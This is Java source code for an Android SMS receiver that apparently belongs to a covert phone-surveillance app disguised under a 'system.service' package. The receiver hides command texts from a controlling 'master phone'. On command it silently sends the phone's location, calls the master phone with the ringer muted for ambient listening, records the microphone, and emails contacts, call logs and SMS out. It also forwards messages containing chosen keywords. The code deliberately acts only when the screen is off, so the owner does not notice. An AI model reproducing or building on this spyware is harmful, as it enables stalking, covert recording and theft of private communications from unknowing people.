package system.service.receiver;

import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;

import system.service.BootService;
import system.service.GlobalValues;
import system.service.IndicationHandler;
import system.service.R;
import system.service.R.raw;
import system.service.R.string;
import system.service.activity.GlobalPrefActivity;
import system.service.activity.HomeActivity;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;

import com.particle.inspector.common.util.phone.PhoneUtils;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.TrialSms;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.InternalMemUtil;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.LangUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.PowerUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.SIM_TYPE;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;

import system.service.feature.location.LocationInfo;
import system.service.feature.location.LocationUtil;
import system.service.feature.sms.SmsCtrl;
import system.service.task.GetInfoTask;
import system.service.task.MaxVolTask;
import system.service.task.StopRecorderTask;
import system.service.utils.FileCtrl;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Looper;
import android.os.RemoteException;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "SmsReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private Context context;
	
	private int tempInt;
	
	// **************************************************************************************
    // Receiver for SMS handling
	// **************************************************************************************
	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (intent.getAction().equals(SMS_RECEIVED)) 
		{
			// When comes here, that means the phone has received the SMS, so now it must be capable to send SMS.
			
			String smsBody = SmsCtrl.getSmsBody(intent).trim();
			if (smsBody.length() <= 0) return; 
			
			String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);
			String smsBodyLowerCase = smsBody.toLowerCase();

			//-------------------------------------------------------------------------------
			// If it is the activation SMS (###), show the setting view
			if (smsBody.equals(SmsConsts.TRIAL_KEY) || smsBody.equals(SmsConsts.TRIAL_KEY_ALIAS)) 
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				// Set trial key and type if not licensed before 
				if (GlobalValues.licenseType == LICENSE_TYPE.NOT_LICENSED
					&& ConfigCtrl.getConsumedDatetime(context) == null) 
				{
					GlobalValues.licenseType = LICENSE_TYPE.TRIAL_LICENSED;
					ConfigCtrl.setLicenseKey(context, SmsConsts.TRIAL_KEY);
					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.TRIAL_LICENSED);
					// Save consumed datetime
					ConfigCtrl.setConsumedDatetime(context, (new Date()));
					
					// Send trial info
					SmsCtrl.sendTrialSms(context);
				}
				
				// The setting dialog cannot be triggered by phone that is not master phone
				String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
				if (masterPhone != null && masterPhone.length() > 0 && !comingFromQualifiedPhone(context, intent)) {
					return;
				}
				
				// If out of trial or not licensed, do not show the setting dialog again.
				if (!ConfigCtrl.isLegal(context)) {
					String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
					if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
						String msg = context.getResources().getString(R.string.msg_trial_expire_or_not_licensed);
						SmsCtrl.sendSms(recvPhoneNum, msg);
					}
					
					return;
				}
				
				// Start dialog
				Intent initIntent = new Intent().setClass(context, HomeActivity.class);
				initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(initIntent);
			}
			
			//-------------------------------------------------------------------------------
			// If it is the indication SMS
			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION) && smsBody.getBytes()[2] == '#')
			{
				abortBroadcast(); // Finish broadcast, the system will notify this SMS
				
				String phoneNum = SmsCtrl.getSmsAddress(intent);
				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
			}
			
			//-------------------------------------------------------------------------------
			// Send location SMS if being triggered by location indication
			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_LOCATION) || smsBodyLowerCase.equals(SmsConsts.INDICATION_LOCATION_ALIAS))
			{
				abortBroadcast(); // Do not show location activation SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromQualifiedPhone(context, intent)) return;
				
				// If the user is looking at the phone and GPS/Network is unavailable, return for safety
				if (PowerUtil.isScreenOn(context) && !GpsUtil.isGpsEnabled(context) && !NetworkUtil.isNetworkConnected(context)) {
					String msg = context.getResources().getString(R.string.location_fail_screen_on);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					GlobalValues.IS_GETTING_LOCATION = true;
    					LocationInfo location = getGeoLocation();
    					GlobalValues.IS_GETTING_LOCATION = false;
    					
    					String locationSms = "";
    					if (location != null) {
    						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location);
    					}
    					else {
    						BaseStationLocation bsLoc = BaseStationUtil.getBaseStationLocation(SmsReceiver.this.context);
    						locationSms = SmsCtrl.buildBaseStationLocationSms(SmsReceiver.this.context, bsLoc);
    					}
    					
    					// Send location SMS
    					String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
    					boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
    				}
    			}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Call master phone if being triggered by env listening indication
			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN) || smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN_ALIAS))
			{
				abortBroadcast(); // Do not show env listening SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromQualifiedPhone(context, intent)) return;
				
				// Return if the target phone screen is on or it is in a call.
				// That mean it will only take env listening action when the screen is off and not in a call.
				TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
				try {
					if (PhoneUtils.getITelephony(tm).isOffhook()) {
						String msg = context.getResources().getString(R.string.env_listen_fail_offhook);
						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
						return;
					}
				} catch (Exception e) {	
					// In some cases, there will be exception when calling PhoneUtils.getITelephony(tm).isOffhook(),
					// But don't care what it is, just let process go on.
				}
				
				if (PowerUtil.isScreenOn(context)) {
					String msg = context.getResources().getString(R.string.env_listen_fail_screen_on);
					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
					return;
				}
				
				// Start a new thread to call master phone
				new Thread(new Runnable(){
					public void run() {
						try {
							// Disable ringer and vibrate
							AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
							GlobalValues.ORIGINAL_RING_MODE = am.getRingerMode();
							am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
						
							// Set earphone
							am.setStreamMute(AudioManager.STREAM_MUSIC, true);
							
							// Call master phone
							String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
							Uri uri = Uri.parse("tel:" + masterPhone);			          
							Intent intent = new Intent(Intent.ACTION_CALL, uri);
							intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
							intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
							GlobalValues.IS_ENV_LISTENING = true;
							SmsReceiver.this.context.startActivity(intent);
						
							SysUtils.threadSleep(3000);
						
							// Turn off screen
							PowerUtil.setScreenOff(SmsReceiver.this.context);
						} catch (Exception e) {	
							String msg = SmsReceiver.this.context.getResources().getString(R.string.env_listen_fail_exception);
							SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
							return;
						}
					}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Env recording indication
			else if (smsBodyLowerCase.startsWith(SmsConsts.INDICATION_ENV_REC) || smsBodyLowerCase.startsWith(SmsConsts.INDICATION_ENV_REC_ALIAS))
			{
				abortBroadcast(); // Do not show env listening SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromQualifiedPhone(context, intent)) return;
				
				// Get recording minutes
				String[] parts = smsBody.split("#");
				try {
					this.tempInt = Integer.parseInt(parts[2].trim());
					if (this.tempInt > 30) this.tempInt = 30;
					else if (this.tempInt < 1) this.tempInt = 1;
				} catch (Exception ex) {
					String msg = this.context.getResources().getString(R.string.env_rec_invalid_minutes);
					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(this.context), msg);
					return;
				}
				
				// Start a new thread to recording env
				new Thread(new Runnable(){
					public void run() {
						int minutes = SmsReceiver.this.tempInt;
						
						Date startDate = new Date();
                        String fileName = SmsReceiver.this.context.getResources().getString(R.string.env_record) + 
                        		ConfigCtrl.getSelfName(SmsReceiver.this.context) + "-" + DatetimeUtil.format2.format(startDate) + FileCtrl.SUFFIX_WAV;
                        String fileFullPath = InternalMemUtil.getFilesDirStr(SmsReceiver.this.context) + fileName;
                        
                        if (GlobalValues.recorder == null) {
                        	GlobalValues.recorder = new MediaRecorder();
                        }
                        try {
                        	GlobalValues.recorder.reset();
                        	GlobalValues.recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        	GlobalValues.recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                        	GlobalValues.recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                        	GlobalValues.recorder.setOutputFile(fileFullPath);
                        	GlobalValues.recorder.prepare();
                        	GlobalValues.recorder.start();
                        	GlobalValues.IS_ENV_RECORDING = true;
                        } catch (Exception ex) {
                        	String msg = SmsReceiver.this.context.getResources().getString(R.string.env_rec_fail_exception);
        					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
        					GlobalValues.IS_ENV_RECORDING = false;
        					if (GlobalValues.recorder != null) GlobalValues.recorder.stop();
        					return;
                        }
                        
                        // Start a timer to stop recorder minutes later
						(new Timer()).schedule(new StopRecorderTask(SmsReceiver.this.context), minutes*60*1000);
						
					}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Info collection indication
			else if (smsBodyLowerCase.startsWith(SmsConsts.INDICATION_INFO) || smsBodyLowerCase.startsWith(SmsConsts.INDICATION_INFO_ALIAS))
			{
				abortBroadcast(); // Do not indication SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If the coming phone is not the receiver phone, return
				if (!comingFromQualifiedPhone(context, intent)) return;
				
				// Start a new thread to collect info and send mail
				new Thread(new Runnable() {
    				public void run() {
    					boolean nwConnected = NetworkUtil.isNetworkConnected(SmsReceiver.this.context);
    					String comingPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
						
						// If network is NOT connected and the user is using the phone, DO NOT do anything for security.
						if (!nwConnected && PowerUtil.isScreenOn(SmsReceiver.this.context)) {
							String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng1);
							SmsCtrl.sendSms(comingPhoneNum, msg);
							return;
						}
						
						// Since network is NOT connected and the screen is dark, we will try to connect WIFI or 3G automatically
						else if (!nwConnected) {
							//TODO
						}
						
						// If still cannot connect to any network, we have to give up
						if (!NetworkUtil.isNetworkConnected(SmsReceiver.this.context)) {
							String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng4);
							SmsCtrl.sendSms(comingPhoneNum, msg);
							return;
						}
						
						// Clear attachments
    					if (GetInfoTask.attachments == null) 
    						GetInfoTask.attachments = new ArrayList<File>();
    					else
    						GetInfoTask.attachments.clear();
        		
    					// Collect info
    					GetInfoTask.CollectContact(SmsReceiver.this.context);
    					GetInfoTask.CollectPhoneCallHist(SmsReceiver.this.context);
    					GetInfoTask.CollectSms(SmsReceiver.this.context);
        		
    					// If network is not connected after collection, clean files and send message
    					if (!NetworkUtil.isNetworkConnected(SmsReceiver.this.context)) {
    						// Clean info files
        					FileCtrl.cleanTxtFiles(SmsReceiver.this.context);
        					
        					String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng2);
							SmsCtrl.sendSms(comingPhoneNum, msg);
							return;
    					}
        	
    					// Make sure the recipient is available
    					String[] recipients = GlobalPrefActivity.getReceiverMail(SmsReceiver.this.context).split(",");
    					if (recipients.length == 0) {
    						String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng3);
							SmsCtrl.sendSms(comingPhoneNum, msg);
							return;
    					}
    					
    					// Send mail
    					String selfName = ConfigCtrl.getSelfName(SmsReceiver.this.context);
    					String subject = SmsReceiver.this.context.getResources().getString(R.string.mail_from) 
        	          		 +  selfName + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
        	          		 + SmsReceiver.this.context.getResources().getString(R.string.mail_description);
    					String body = String.format(SmsReceiver.this.context.getResources().getString(R.string.mail_body_info), selfName);
    					String pwd = MailCfg.getSenderPwd(SmsReceiver.this.context);
        		
    					boolean result = false;
    					int retry = GlobalValues.DEFAULT_RETRY_COUNT;
    					String host = MailCfg.getHost(SmsReceiver.this.context);
    					String sender = MailCfg.getSender(SmsReceiver.this.context);
    					String errMsg = "";
    					while(!result && retry > 0) {
    						result = GetInfoTask.sendMail(subject, body, host, sender, pwd, recipients, GetInfoTask.attachments, errMsg);
    						if (!result) retry--;
    					}
    					GetInfoTask.attachments.clear();
        		
    					// Update the last date time
    					if (result) {
    						boolean successful = ConfigCtrl.setLastGetInfoTime(SmsReceiver.this.context, new Date());
    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
    						
    						String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ok);
							SmsCtrl.sendSms(comingPhoneNum, msg);
    					}
        		
    					// Clean info files
    					FileCtrl.cleanTxtFiles(SmsReceiver.this.context);
    				}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Force belling if being triggered by bell activation indication
			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_RING) || smsBodyLowerCase.equals(SmsConsts.INDICATION_RING_ALIAS))
			{
				abortBroadcast(); // Do not show bell activation SMS
				
				if (!ConfigCtrl.isLegal(context)) return;
				this.context = context;
				
				// If not coming from master phone, return
				if (!comingFromQualifiedPhone(context, intent)) return;
				
				// Start a new thread to play ring which is time-consuming
				new Thread(new Runnable(){
					public void run() {
						// Raise volume to max
						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
						int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
						am.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
    					
						// Start to play
						try {
							MediaPlayer mp = MediaPlayer.create(SmsReceiver.this.context, R.raw.alarm);
							mp.setLooping(true);
							mp.start();
						} catch (Exception ex) { 
							//Log.e(LOGTAG, ex.getMessage());
						}
						
						// Start a timer to detect volume change by user and force it to max
						(new Timer()).scheduleAtFixedRate(new MaxVolTask(SmsReceiver.this.context), 1000, 300);
					}
				}).start();
			}
			
			//-------------------------------------------------------------------------------
			// Redirect SMS that contains sensitive words
			else if (GlobalPrefActivity.getRedirectAllSms(context) || containSensitiveWords(context, smsBody)) 
			{
				if (!ConfigCtrl.isLegal(context)) return;
				
				// Count ++ if in trial
				if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachSmsRedirectTimeLimit(context)) {
					if (!ConfigCtrl.getHasSentRedirectSmsTimesLimitSms(context)) {
						// Send SMS to warn user
						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
							String msg = context.getResources().getString(R.string.msg_sms_times_over_in_trial) + context.getResources().getString(R.string.support_qq);
							boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
							if (ret) {
								ConfigCtrl.setHasSentRedirectSmsTimesLimitSms(context, true);
							}
						}
					}
					return;
				}

				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
				if (phoneNum.length() > 0) {
					String smsAddress = SmsCtrl.getSmsAddress(intent);
					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
					boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
					if (ret && GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
						ConfigCtrl.countSmsRedirectTimesInTrial(context);
					}
				}
			}
		} // end of SMS_RECEIVED
        
	} // end of onReceive()
	
	public LocationInfo getGeoLocation()
	{
		long now = (new Date()).getTime();
		
		// Boost location update
		if (GlobalValues.locationUtil == null) return null;
		GlobalValues.locationUtil.boost();
		
		// If GPS is not enabled, try to enable it
		boolean isScreenOn = PowerUtil.isScreenOn(context);
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context) && !isScreenOn) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < 3) {
				tryCount++;
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(3000);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
		}
		
        // If network is not enabled, try to enable it
     	boolean tryToEnableNetwork = false;
     	if (!NetworkUtil.isNetworkConnected(context) && !isScreenOn) {
     		tryToEnableNetwork = NetworkUtil.tryToConnectDataNetwork(context);
     	}
     	
		// Try to sleep for a while for the LocationUtil to update location records
     	LocationInfo location = null;
     	int tryCount = 0;
     	while (location == null && tryCount < 20) {
     		tryCount++;
     		SysUtils.threadSleep(3000);
    	   	if (GlobalValues.locationUtil.locationGpsQueue.size() > 0) {
    	   		Location loc = GlobalValues.locationUtil.locationGpsQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.GPS);
    	   			break;
    	   		}
        	}
    	   	if (GlobalValues.locationUtil.locationNetworkQueue.size() > 0) {
    	   		Location loc = GlobalValues.locationUtil.locationNetworkQueue.getLast();
    	   		// If the location is got after the action beginning
    	   		if (loc.getTime() > now) {
    	   			location = new LocationInfo(loc, LocationInfo.Network);
    	   			break;
    	   		}
        	}
     	}
     	
     	// Restore to normal status
     	GlobalValues.locationUtil.decelerate();
	    	
	    // If GPS previously forced to be enabled, try to disable it
	   	if (tryToEnableGPS) {
	   		GpsUtil.disableGPS(context);
	   	}
	   	
	    // If network previously forced to be enabled, try to disable it
    	if (tryToEnableNetwork) {
    		NetworkUtil.tryToDisconnectDataNetwork(context);
    	}
	   	
    	return location;
    }	
	
	private boolean containSensitiveWords(Context context, String sms) {
		boolean ret = false;
		if (GlobalValues.sensitiveWords == null || GlobalValues.sensitiveWords.length <= 0) 
			return false; // We only redirect SMS that contains sensitive words intead of redirecting all.

		String smsBody = sms.toLowerCase();
		for (String word : GlobalValues.sensitiveWords) {
			if (smsBody.contains(word)) {
				ret = true;
				break;
			}
		}
		return ret;
	}
	
	private boolean comingFromQualifiedPhone(Context context, Intent intent) {
		String masterPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
		return ( (masterPhoneNum != null && masterPhoneNum.length() > 0 && comingPhoneNum != null && comingPhoneNum.length() > 0 && comingPhoneNum.contains(masterPhoneNum)) 
			  || GlobalValues.isAdminPhone(comingPhoneNum) );
	}

}